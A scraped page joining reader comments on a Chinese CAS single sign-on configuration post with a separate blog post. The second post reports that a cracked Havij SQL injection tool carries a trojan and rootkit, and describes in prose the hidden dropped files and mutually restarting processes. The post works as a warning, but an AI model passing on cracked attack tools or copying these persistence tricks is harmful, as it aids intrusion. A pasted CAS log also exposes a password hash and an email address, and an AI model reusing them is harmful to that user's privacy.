通过ldap验证，改怎样修改呢  <a href="http://www.blogjava.net/tufanshu/archive/2011/01/21/343290.html#post" target="_blank">回复</a>  <a href="http://www.blogjava.net/comment?author=wuximin" title="查看该作者发表过的评论" target="_blank">更多评论</a>
<a href=""></a>  <a href=""></a>
<a href="http://www.blogjava.net/tufanshu/archive/2011/01/21/343290.html#351783" title="permalink: re: cas配置全攻略" target="_blank">/#</a> <a href=""></a>re: cas配置全攻略</p>
<p>2011-06-05 18:19 | <a href="http://xn--rgv/" target="_blank">artd</a>
按您的要求，为何还是不行呀，不知道那里出问题了。
不过我用的server是3.3.5.1
用3.4.5也不行，有空交流一下哟。
以下是log信息
2011-06-05 18:09:19,515 DEBUG [org.jasig.cas.authentication.principal.UsernamePasswordCredentialsToPrincipalResolver] - Attempting to resolve a principal...
2011-06-05 18:09:19,515 DEBUG [org.jasig.cas.authentication.principal.UsernamePasswordCredentialsToPrincipalResolver] - Creating SimplePrincipal for [test]
2011-06-05 18:09:20,421 DEBUG [org.jasig.services.persondir.support.jdbc.SingleRowJdbcPersonAttributeDao] - Created seed map=&#39;{username=[test]}&#39; for uid=&#39;test&#39;
2011-06-05 18:09:20,421 DEBUG [org.jasig.services.persondir.support.jdbc.SingleRowJdbcPersonAttributeDao] - Adding attribute &#39;username&#39; with value &#39;[test]&#39; to query builder &#39;null&#39;
2011-06-05 18:09:20,421 DEBUG [org.jasig.services.persondir.support.jdbc.SingleRowJdbcPersonAttributeDao] - Generated query builder &#39;sql=[username = ?] args=[test]&#39; from query Map {username=[test]}.
2011-06-05 18:09:20,546 DEBUG [org.jasig.services.persondir.support.jdbc.SingleRowJdbcPersonAttributeDao] - Executed &#39;select id,username,password,email,score from user where username = ?&#39; with arguments [test] and got results [{id=20428, username=test, password=1a16128849444873, email=et@163.com, score=6}]
2011-06-05 18:09:20,562 INFO [org.jasig.cas.CentralAuthenticationServiceImpl] - Granted service ticket [ST-1-cp3cb14yiqbqnYfg7C1f-cas] for service [<a href="http://d7.abc.com/simple.php" target="_blank"><a href="http://d7.abc.com/simple.php">http://d7.abc.com/simple.php</a></a>] for user [test]
2011-06-05 18:09:20,640 DEBUG [org.springframework.web.servlet.view.RedirectView] - Rendering view with name &#39;null&#39; with model null and static attributes {}
2011-06-05 18:09:20,703 DEBUG [org.springframework.web.servlet.view.ResourceBundleViewResolver] - Cached view [casServiceSuccessView_zh_CN]
2011-06-05 18:09:20,703 DEBUG [org.springframework.web.servlet.view.JstlView] - Rendering view with name &#39;casServiceSuccessView&#39; with model {assertion=[principals={[[Principal=test, attributes={authenticationMethod=com.jute.framework.jdbc.QueryDatabaseAuthenticationHandler}]]} for service=<a href="http://d7.abc.com/simple.php" target="_blank"><a href="http://d7.abc.com/simple.php">http://d7.abc.com/simple.php</a></a>]} and static attributes {}
2011-06-05 18:09:20,750 DEBUG [org.springframework.web.servlet.view.JstlView] - Added model object &#39;assertion&#39; of type [org.jasig.cas.validation.ImmutableAssertionImpl] to request in view with name &#39;casServiceSuccessView&#39;
2011-06-05 18:09:20,750 DEBUG [org.springframework.web.servlet.view.JstlView] - Forwarding to resource [/WEB-INF/view/jsp/protocol/2.0/casServiceValidationSuccess.jsp] in InternalResourceView &#39;casServiceSuccessView&#39;
  <a href="http://www.blogjava.net/tufanshu/archive/2011/01/21/343290.html#post" target="_blank">回复</a>  <a href="http://www.blogjava.net/comment?author=artd" title="查看该作者发表过的评论" target="_blank">更多评论</a>
<a href=""></a>  <a href=""></a></p>
<p><a href="http://www.blogjava.net/tufanshu/archive/2011/01/21/343290.html#361580" title="permalink: re: cas配置全攻略" target="_blank">/#</a> <a href=""></a>re: cas配置全攻略<a href=""></a></p>
<p>2011-10-19 15:24 | <a href="">fanfree</a>
同样遇到 Map是空的，没有附加属性  <a href="http://www.blogjava.net/tufanshu/archive/2011/01/21/343290.html#post" target="_blank">回复</a>  <a href="http://www.blogjava.net/comment?author=fanfree" title="查看该作者发表过的评论" target="_blank">更多评论</a>
<a href=""></a>  <a href=""></a>
<a href="http://www.blogjava.net/RequireRegister.aspx" target="_blank">新用户注册</a>  <a href="">刷新评论列表</a>  </p>
<p><a href=""></a> <a href="http://q.cnblogs.com/">博问 - 解决您的IT难题</a>   <a href="http://www.cnblogs.com/" target="_blank">博客园</a>  <a href="http://q.cnblogs.com/" target="_blank">博问</a>  <a href="http://news.cnblogs.com/" target="_blank">IT新闻</a>  <a href="http://job.cnblogs.com/cate-java_programmer/" target="_blank">Java程序员招聘</a> 标题  请输入标题 姓名  请输入你的姓名 主页 请输入验证码 验证码 /*  <img src="" alt=""> 内容(请不要发表任何与政治相关的内容) 请输入评论内容 Remember Me?   <a href="http://www.blogjava.net/login.aspx?ReturnURL=http://www.blogjava.net/tufanshu/archive/2011/01/21/343290.html&amp;SourceURL=/tufanshu/archive/2011/01/21/343290.html" target="_blank">登录</a>       [使用Ctrl+Enter键可以直接提交]    IT新闻：
· <a href="http://news.cnblogs.com/n/149115/" target="_blank">苹果在移动支付领域之慢，是福是祸？</a>
· <a href="http://news.cnblogs.com/n/149114/" target="_blank">黑莓应用商店应用下载量突破30亿次，应用数量达9万款</a>
· <a href="http://news.cnblogs.com/n/149113/" target="_blank">微软将推出Bing天使基金孵化器</a>
· <a href="http://news.cnblogs.com/n/149112/" target="_blank">苹果在华测试iPad mini：微胖 具备通话功能</a>
· <a href="http://news.cnblogs.com/n/149111/" target="_blank">抱上微软粗腿不怕！诺基亚豪言明年定走出困境</a></p>
<p>博客园首页随笔：
· <a href="http://www.cnblogs.com/lzrabbit/archive/2012/07/09/2574491.html" target="_blank">MVC3使用Unity实现依赖注入接口与于实现类自动注册</a>
· <a href="http://www.cnblogs.com/stoic/archive/2012/07/09/2582212.html" target="_blank">k-means clustering K平均算法</a>
· <a href="http://www.cnblogs.com/izumu/archive/2012/07/09/2582200.html" target="_blank">【hdu - 1061 Rightmost Digit】</a>
· <a href="http://www.cnblogs.com/refactor/archive/2012/07/09/2575995.html" target="_blank">SqlServer 对 数据类型 text 的操作</a>
· <a href="http://www.cnblogs.com/stephen-liu74/archive/2012/07/09/2423565.html" target="_blank">Step By Step(Lua弱引用table)</a>
知识库：
· <a href="http://kb.cnblogs.com/page/143279/" target="_blank">页面前端的水有多深？再议页面开发</a>
· <a href="http://kb.cnblogs.com/page/130367/" target="_blank">Fiddler 教程</a>
· <a href="http://kb.cnblogs.com/page/148772/" target="_blank">关于编程学习的七点思索</a>
· <a href="http://kb.cnblogs.com/page/115175/" target="_blank">一地鸡毛 — 软件项目中的人际困局</a>
· <a href="http://kb.cnblogs.com/page/148841/" target="_blank">互联网——降级论</a>  网站导航:</p>
<p><a href="http://www.cnblogs.com/" title="程序员的网上家园" target="_blank">博客园</a>   <a href="http://news.cnblogs.com/" target="_blank">IT新闻</a>   <a href="http://kb.cnblogs.com/" target="_blank">知识库</a>   <a href="http://www.cppblog.com/" target="_blank">C++博客</a>   <a href="http://job.cnblogs.com/" target="_blank">程序员招聘</a>   <a href="http://www.blogjava.net/tufanshu/archive/2011/01/21/343290.html?opt=admin" target="_blank">管理</a> 相关文章:</p>
<ul>
<li><a href="http://www.blogjava.net/tufanshu/archive/2011/02/09/343972.html" target="_blank">cas server 3.4.5 部署在weblogic问题记录</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2011/01/26/343543.html" target="_blank">cas server使用mysql数据库和oralce数据库的差异</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2011/01/21/343318.html" target="_blank">cas server logout的问题</a></li>
<li><a href="">cas配置全攻略</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2008/06/26/210852.html" target="_blank">JForum 的 SSO集成的问题解决</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2007/12/24/170126.html" target="_blank">apache2.2.6+tomcat5.5.17配置说明</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2006/12/04/85371.html" target="_blank">找不到C.TLD的问题</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2006/11/01/78479.html" target="_blank">roller2.3源代码部署笔录</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2006/07/31/60981.html" target="_blank">tomcat 服务器抛出socket异常“文件打开太多”的问题</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2005/12/26/25499.html" target="_blank">hsql的使用</a><br>Copyright ©2012 雪地孤鸿 Powered By: <a href="http://www.cnblogs.com/" target="_blank">博客园</a> 模板提供：<a href="http://blog.hjenglish.com/" target="_blank">沪江博客</a>
<a href="&quot;Go to the previous month&quot;">&lt;</a>2011年1月<a href="&quot;Go to the next month&quot;">&gt;</a>日一二三四五六2627282930311234567891011121314151617181920<a href="http://www.blogjava.net/tufanshu/archive/2011/01/21.html" target="_blank">21</a>22232425<a href="http://www.blogjava.net/tufanshu/archive/2011/01/26.html" target="_blank">26</a>272829303112345</li>
</ul>
<h3 id="-">常用链接</h3>
<ul>
<li><a href="http://www.blogjava.net/tufanshu/MyPosts.html" target="_blank">我的随笔</a></li>
<li><a href="http://www.blogjava.net/tufanshu/MyComments.html" target="_blank">我的评论</a></li>
<li><a href="http://www.blogjava.net/tufanshu/OtherPosts.html" target="_blank">我的参与</a></li>
<li><a href="http://www.blogjava.net/tufanshu/RecentComments.html" target="_blank">最新评论</a></li>
</ul>
<h3 id="-13-">留言簿(13)</h3>
<ul>
<li><a href="http://www.blogjava.net/tufanshu/Contact.aspx?id=1" target="_blank">给我留言</a></li>
<li><a href="http://www.blogjava.net/tufanshu/default.aspx?opt=msg" target="_blank">查看公开留言</a></li>
<li><a href="http://www.blogjava.net/tufanshu/admin/MyMessages.aspx" target="_blank">查看私人留言</a></li>
</ul>
<h1 id="-">随笔分类</h1>
<ul>
<li><a href="http://www.blogjava.net/tufanshu/category/9675.html" target="_blank">appfuse(1)</a><a href="http://www.blogjava.net/tufanshu/category/9675.html/rss" title="Subscribe to appfuse(1)" target="_blank"><img src="&quot;Subscribe to appfuse(1" alt="">&quot;)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/category/33305.html" target="_blank">CRM&amp;ERP(1)</a><a href="http://www.blogjava.net/tufanshu/category/33305.html/rss" title="Subscribe to CRM&amp;ERP(1)" target="_blank"><img src="&quot;Subscribe to CRM&amp;ERP(1" alt="">&quot;)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/category/44350.html" target="_blank">Grails(3)</a><a href="http://www.blogjava.net/tufanshu/category/44350.html/rss" title="Subscribe to Grails(3)" target="_blank"><img src="&quot;Subscribe to Grails(3" alt="">&quot;)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/category/4974.html" target="_blank">java(11)</a><a href="http://www.blogjava.net/tufanshu/category/4974.html/rss" title="Subscribe to java(11)" target="_blank"><img src="&quot;Subscribe to java(11" alt="">&quot;)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/category/41549.html" target="_blank">ofbiz学习(1)</a><a href="http://www.blogjava.net/tufanshu/category/41549.html/rss" title="Subscribe to ofbiz学习(1)" target="_blank"><img src="&quot;Subscribe to ofbiz学习(1" alt="">&quot;)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/category/30111.html" target="_blank">seam2.0学习笔记(1)</a><a href="http://www.blogjava.net/tufanshu/category/30111.html/rss" title="Subscribe to seam2.0学习笔记(1)" target="_blank"><img src="&quot;Subscribe to seam2.0学习笔记(1" alt="">&quot;)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/category/4243.html" target="_blank">SPRING</a><a href="http://www.blogjava.net/tufanshu/category/4243.html/rss" title="Subscribe to SPRING" target="_blank"><img src="&quot;Subscribe to SPRING&quot;" alt=""></a></li>
<li><a href="http://www.blogjava.net/tufanshu/category/30359.html" target="_blank">sso(3)</a><a href="http://www.blogjava.net/tufanshu/category/30359.html/rss" title="Subscribe to sso(3)" target="_blank"><img src="&quot;Subscribe to sso(3" alt="">&quot;)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/category/4244.html" target="_blank">STRUTS(1)</a><a href="http://www.blogjava.net/tufanshu/category/4244.html/rss" title="Subscribe to STRUTS(1)" target="_blank"><img src="&quot;Subscribe to STRUTS(1" alt="">&quot;)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/category/3522.html" target="_blank">Sync4j(1)</a><a href="http://www.blogjava.net/tufanshu/category/3522.html/rss" title="Subscribe to Sync4j(1)" target="_blank"><img src="&quot;Subscribe to Sync4j(1" alt="">&quot;)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/category/3293.html" target="_blank">SyncML(2)</a><a href="http://www.blogjava.net/tufanshu/category/3293.html/rss" title="Subscribe to SyncML(2)" target="_blank"><img src="&quot;Subscribe to SyncML(2" alt="">&quot;)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/category/36144.html" target="_blank">大战SOA &amp; MULE</a><a href="http://www.blogjava.net/tufanshu/category/36144.html/rss" title="Subscribe to 大战SOA &amp; MULE" target="_blank"><img src="&quot;Subscribe to 大战SOA &amp; MULE&quot;" alt=""></a></li>
<li><a href="http://www.blogjava.net/tufanshu/category/15210.html" target="_blank">工作日志(2)</a><a href="http://www.blogjava.net/tufanshu/category/15210.html/rss" title="Subscribe to 工作日志(2)" target="_blank"><img src="&quot;Subscribe to 工作日志(2" alt="">&quot;)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/category/4242.html" target="_blank">开发工具(3)</a><a href="http://www.blogjava.net/tufanshu/category/4242.html/rss" title="Subscribe to 开发工具(3)" target="_blank"><img src="&quot;Subscribe to 开发工具(3" alt="">&quot;)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/category/22461.html" target="_blank">生活感悟(1)</a><a href="http://www.blogjava.net/tufanshu/category/22461.html/rss" title="Subscribe to 生活感悟(1)" target="_blank"><img src="&quot;Subscribe to 生活感悟(1" alt="">&quot;)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/category/40597.html" target="_blank">系统维护(3)</a><a href="http://www.blogjava.net/tufanshu/category/40597.html/rss" title="Subscribe to 系统维护(3)" target="_blank"><img src="&quot;Subscribe to 系统维护(3" alt="">&quot;)</a></li>
</ul>
<h1 id="-">随笔档案</h1>
<ul>
<li><a href="http://www.blogjava.net/tufanshu/archive/2011/02.html" target="_blank">2011年2月 (2)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2011/01.html" target="_blank">2011年1月 (3)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2010/12.html" target="_blank">2010年12月 (1)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2010/05.html" target="_blank">2010年5月 (1)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2010/03.html" target="_blank">2010年3月 (1)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2009/12.html" target="_blank">2009年12月 (1)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2009/09.html" target="_blank">2009年9月 (1)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2009/08.html" target="_blank">2009年8月 (1)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2009/07.html" target="_blank">2009年7月 (1)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2009/05.html" target="_blank">2009年5月 (1)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2009/04.html" target="_blank">2009年4月 (1)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2009/02.html" target="_blank">2009年2月 (1)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2008/07.html" target="_blank">2008年7月 (1)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2008/06.html" target="_blank">2008年6月 (1)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2008/03.html" target="_blank">2008年3月 (3)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2007/12.html" target="_blank">2007年12月 (1)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2007/08.html" target="_blank">2007年8月 (1)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2007/07.html" target="_blank">2007年7月 (1)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2006/12.html" target="_blank">2006年12月 (1)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2006/11.html" target="_blank">2006年11月 (1)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2006/10.html" target="_blank">2006年10月 (1)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2006/09.html" target="_blank">2006年9月 (1)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2006/07.html" target="_blank">2006年7月 (1)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2006/04.html" target="_blank">2006年4月 (2)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2005/12.html" target="_blank">2005年12月 (1)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2005/11.html" target="_blank">2005年11月 (1)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2005/10.html" target="_blank">2005年10月 (4)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2005/09.html" target="_blank">2005年9月 (1)</a></li>
</ul>
<h1 id="-">文章档案</h1>
<ul>
<li><a href="http://www.blogjava.net/tufanshu/archives/2005/09.html" target="_blank">2005年9月 (1)</a></li>
</ul>
<h1 id="blog">blog</h1>
<ul>
<li><a href="http://www.blogjava.net/eamoi/" target="_blank">eamoi之Coder日志</a></li>
<li>ajax</li>
<li><a href="http://www.blogjava.net/eamoi" target="_blank">liferayPortal</a></li>
<li><a href="http://steeven.cnblogs.com/" target="_blank">steeven</a></li>
<li><a href="http://www.cnblogs.com/zhengyun_ustc/" target="_blank">sync4j</a></li>
<li><a href="http://www.u2o.net/blog/default.asp" target="_blank">sync4j1</a></li>
<li><a href="http://www.blogjava.net/sean" target="_blank">大胃</a></li>
<li><a href="http://www.blogjava.net/zyb9114/" target="_blank">月亮的太阳</a></li>
<li><a href="http://www.blogjava.net/SteelHand" target="_blank">铁手剑谱</a></li>
<li>铁手</li>
</ul>
<h3 id="-">搜索</h3>
<p>*</p>
<ul>
<li></li>
</ul>
<h3 id="-http-www-blogjava-net-tufanshu-commentsrss-aspx-">最新评论 <a href="http://www.blogjava.net/tufanshu/CommentsRSS.aspx" target="_blank"><img src="" alt=""></a></h3>
<ul>
<li><a href="http://www.blogjava.net/tufanshu/archive/2011/11/02/343972.html#362546" target="_blank">1. re: cas server 3.4.5 部署在weblogic问题记录[未登录]</a></li>
<li>评论内容较长,点击标题查看</li>
<li>--大雄</li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2011/10/19/343290.html#361580" target="_blank">2. re: cas配置全攻略</a></li>
<li>同样遇到 Map是空的，没有附加属性</li>
<li>--fanfree</li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2011/06/19/343318.html#352630" target="_blank">3. re: cas server logout的问题</a></li>
<li>加了这个还是停在原来的退出页面，</li>
<li>--artd</li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2011/06/05/343290.html#351783" target="_blank">4. re: cas配置全攻略</a></li>
<li>评论内容较长,点击标题查看</li>
<li>--artd</li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2011/03/29/343290.html#347172" target="_blank">5. re: cas配置全攻略</a></li>
<li>通过ldap验证，改怎样修改呢</li>
<li>--wuximin</li>
</ul>
<h3 id="-">阅读排行榜</h3>
<ul>
<li><a href="http://www.blogjava.net/tufanshu/archive/2006/10/20/76389.html" target="_blank">1. linux+php5.1.6+mysql5.0.2+apache2.0.55安装配置说明：(12245)</a></li>
<li><a href="">2. cas配置全攻略(3704)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2006/09/14/69691.html" target="_blank">3. 在tomcat下发布使用eclipse中的ant打包后的war文件(3490)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2008/03/25/188552.html" target="_blank">4. cas配置之初体验(3313)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2008/07/26/217681.html" target="_blank">5. opencrx安装手记(2914)</a></li>
</ul>
<h3 id="-">评论排行榜</h3>
<ul>
<li><a href="">1. cas配置全攻略(7)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2006/10/20/76389.html" target="_blank">2. linux+php5.1.6+mysql5.0.2+apache2.0.55安装配置说明：(4)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2005/10/15/15574.html" target="_blank">3. SyncML Intensive 继续(4)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2005/11/17/20309.html" target="_blank">4. jdk1.4升级到JDK1.5的问题(3)</a></li>
<li><a href="http://www.blogjava.net/tufanshu/archive/2009/09/03/293787.html" target="_blank">5. ofbiz9 + oracle 11g(3)</a></li>
</ul>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/CAS/">CAS</a></li></span></span> | <span class="tags">Tagged <a href="/tags/CAS/" class="label label-primary">CAS</a></span> | <span class="time">recent updated:<time title="2014-03-07 09:54:39"datetime="2014-03-07 09:54:39"> mar. 7 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-CAS--cas配置全攻略-哈哈-吼吼-这是个好地方-BlogJava/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-CAS--cas配置全攻略-哈哈-吼吼-这是个好地方-BlogJava" data-count-type="comments">暂无评论</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>



  <article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-安全-X--这个世界是一点懒都偷不了的！_Vexs_百度空间/">这个世界是一点懒都偷不了的！_Vexs_百度空间</a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:39.000Z"> <a href="/2014/02/02/2014-02-02-安全-X--这个世界是一点懒都偷不了的！_Vexs_百度空间/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="-_vexs_-">这个世界是一点懒都偷不了的！<em>Vexs</em>百度空间</h1>
<h3 id="-">分享到</h3>
<ul>
<li><a href="">一键分享</a></li>
<li><a href="">QQ空间</a></li>
<li><a href="">新浪微博</a></li>
<li><a href="">百度云收藏</a></li>
<li><a href="">人人网</a></li>
<li><a href="">腾讯微博</a></li>
<li><a href="">百度相册</a></li>
<li><a href="">开心网</a></li>
<li><a href="">腾讯朋友</a></li>
<li><a href="">百度贴吧</a></li>
<li><a href="">豆瓣网</a></li>
<li><a href="">搜狐微博</a></li>
<li><a href="">百度新首页</a></li>
<li><a href="">QQ好友</a></li>
<li><a href="">和讯微博</a></li>
<li><a href="">更多...</a></li>
</ul>
<p><a href="">百度分享</a></p>
<p><a href="http://hi.baidu.com/"></a></p>
<ul>
<li><a href="http://hi.baidu.com/home" target="_blank">首页</a></li>
<li><a href="http://hi.baidu.com/robinchia" target="_blank">我的主页</a></li>
<li><a href="http://hi.baidu.com/robinchia/albums" target="_blank">相册</a></li>
<li><a href="http://hi.baidu.com/index/" target="_blank">广场</a></li>
<li><a href="http://youxi.baidu.com/yxpm/pm.jsp?pid=10106000091_970983" target="_blank">游戏</a></li>
<li><a href="http://hi.baidu.com/robinchia/qfriend/show/follow#search" target="_blank">昵称搜索</a>
*</li>
<li><a href="http://hi.baidu.com/qmsg" target="_blank">消息 </a>
*</li>
<li><a href="http://msg.baidu.com/" target="_blank">私信</a>
*</li>
<li><a href="http://hi.baidu.com/set/show/theme" target="_blank">模板</a>
*</li>
<li><a href="http://hi.baidu.com/set/show/profile" target="_blank">设置</a>
*</li>
<li><a href="https://passport.baidu.com/?logout&amp;bdstoken=f751b63e407180365c5031057f6eaeba&amp;u=http://hi.baidu.com/vexs_exp/item/9c48a91fdfe4d4098ebde48e" target="_blank">退出</a>
<a href="">关注此空间</a><h1 id="-vexs-http-hi-baidu-com-vexs_exp-"><a href="http://hi.baidu.com/vexs_exp" target="_blank">Vexs</a></h1>
</li>
</ul>
<p>Security Development Lifecycle</p>
<p>2012-09-28 15:03</p>
<h2 id="-">这个世界是一点懒都偷不了的！</h2>
<p>最近发现了国外有人发布了Havij v1.16 Pro Cracked，随即我在x-bug转发了贴，随后帖子又被友情转到了freebuf。
在27号收到一个惊人的报告（9.27 UPDATE警告 Freebuf团队发现此软件绑有木马，请谨慎下载。）</p>
<p>我印象里这个Loader我测试过没有发现异常啊，我也相信发布Crack版本的作者和转贴的人不会这么无聊，怎么会这样，大家都是搞安全的，这种小动作没意思，随即抽空又做了下检查，确实没有发现异常，问了几个人，都说没发现异常。
但那帖子还有截图，证据明显，昨天比较忙只简单回复了下就懒得继续深究了，但在刚刚又想起了这很郁闷的事，决定再次看看。</p>
<p>突然记起我在7月22号转载了一个早期的版本，那个是时候还没有Cracked版本出现，只是安装程序。
<a href="http://hi.baidu.com/vexs_exp/item/bfaa5855614bbfdfd58bac5b" target="_blank"><a href="http://hi.baidu.com/vexs_exp/item/bfaa5855614bbfdfd58bac5b">http://hi.baidu.com/vexs_exp/item/bfaa5855614bbfdfd58bac5b</a></a>
在这个帖子中明确提到这个包存在古怪，但当时没时间详细分析。</p>
<p>刚刚我重新下载了这个包，简单分析了下，事情原来是这样的：</p>
<p><img src="" alt=""></p>
<p>图标都是白色的，二次打包后的表现。</p>
<p>运行Havij 1.16Pro.exe会释放两个文件到C:\Documents and Settings\Administrator\Local Settings\Application Data。</p>
<p><img src="" alt=""></p>
<p>C:\Documents and Settings\Administrator\Local Settings\Application Data\taskung.exe
C:\Documents and Settings\Administrator\Local Settings\Application Data\svhost.exe
然后会启动真实的安装程序Havij 1.16 Pro.exe，这个会释放在临时文件夹里%temp%。</p>
<p><img src="" alt=""></p>
<p>上面两个恶意文件会设为隐藏属性，进程互相监控，单杀一个另一个会自动激活并再次启动Havij 1.16 Pro.exe安装程序。</p>
<p>经分析taskung.exe和svhost.exe两个程序，使用C/#编译的，也加了壳，脱壳后分析源码，终于发现了可疑的地方。</p>
<p><img src="" alt=""></p>
<p>其中taskung.exe那个是个rootkit。</p>
<p><img src="" alt=""></p>
<p>当时我在帖子中明确提到这个包存在古怪，最好在虚拟机里自行提取真实的安装程序，当时偷了个懒也没具体分析恶意代码，到头来还得分析出来问题，这个懒看来还是没偷了，世界真的应该是这样吗？</p>
<p>分享到： <a href="&quot;分享到QQ空间&quot;"></a> <a href="&quot;分享到新浪微博&quot;"></a> <a href="&quot;分享到腾讯微博&quot;"></a> <a href="&quot;分享到人人网&quot;"></a></p>
<p><a href="http://tousu.baidu.com/hi.add?tsurl=http://hi.baidu.com/vexs_exp/item/9c48a91fdfe4d4098ebde48e" target="_blank">举报</a> 浏览(1318) <a href="">评论(8)</a> <a href="">转载(3)</a></p>
<h3 id="-">你可能也喜欢</h3>
<ul>
<li><a href="http://hi.baidu.com/56dapei/item/a17e8904e35813f573e67616" target="_blank"><img src="&quot;每年都要穿的最in单品 备战军绿色外套&quot;" alt="每年都要穿的最in单品 备战军绿色外套"></a> <a href="http://hi.baidu.com/56dapei/item/a17e8904e35813f573e67616" target="_blank">每年都要穿的最in单品 备战军绿色外套</a></li>
<li><a href="http://hi.baidu.com/vxlsjlkcudbjuxq/item/affee379af1c491e5d1789c2" target="_blank"><img src="&quot;《W》2013年10月“文艺冲突”主题大片&quot;" alt="《W》2013年10月“文艺冲突”主题大片"></a> <a href="http://hi.baidu.com/vxlsjlkcudbjuxq/item/affee379af1c491e5d1789c2" target="_blank">《W》2013年10月“文艺冲突”主题大片</a></li>
<li><a href="http://hi.baidu.com/anjieing/item/fad3df72158c28026e29f609" target="_blank"><img src="&quot;andreea diaconu by inez &amp; vinoodh for vogue paris october 2013&quot;" alt="andreea diaconu by inez &amp; vinoodh for vogue paris october 2013"></a> <a href="http://hi.baidu.com/anjieing/item/fad3df72158c28026e29f609" target="_blank">andreea diaconu by inez &amp; vinoodh for vogue paris october 2013</a></li>
<li><a href="http://hi.baidu.com/addidea/item/dbc353a6272d51f715329b4c" target="_blank"><img src="&quot;时尚大片：妖女型男堕落无罪&quot;" alt="时尚大片：妖女型男堕落无罪"></a> <a href="http://hi.baidu.com/addidea/item/dbc353a6272d51f715329b4c" target="_blank">时尚大片：妖女型男堕落无罪</a></li>
<li><a href="http://hi.baidu.com/blue4733/item/3a0ae636197385f096f88ded" target="_blank"><img src="&quot;古典的英式霓虹&quot;" alt="古典的英式霓虹"></a> <a href="http://hi.baidu.com/blue4733/item/3a0ae636197385f096f88ded" target="_blank">古典的英式霓虹</a></li>
<li><a href="http://hi.baidu.com/novcg/item/2fb1124af17f29f5bcf4517b" target="_blank"><img src="&quot;Zara 2013秋冬广告&quot;" alt="Zara 2013秋冬广告"></a> <a href="http://hi.baidu.com/novcg/item/2fb1124af17f29f5bcf4517b" target="_blank">Zara 2013秋冬广告</a></li>
<li><a href="http://hi.baidu.com/vexs_exp/item/365faadaa833c814e1f46f5a" target="_blank"><img src="&quot;CentOS 6 + PHP + Nginx&quot;" alt="CentOS 6 + PHP + Nginx"></a> <a href="http://hi.baidu.com/vexs_exp/item/365faadaa833c814e1f46f5a" target="_blank">CentOS 6 + PHP + Nginx</a>
<a href="http://hi.baidu.com/vexs_exp/item/ca3d1c1d1fbee8711009b5fb" title="上一篇"></a></li>
</ul>
<p><a href="http://hi.baidu.com/vexs_exp/item/3ad37c7d8a68542a5d17893c" title="下一篇"></a></p>
<h3 id="-">本文最近访客</h3>
<ul>
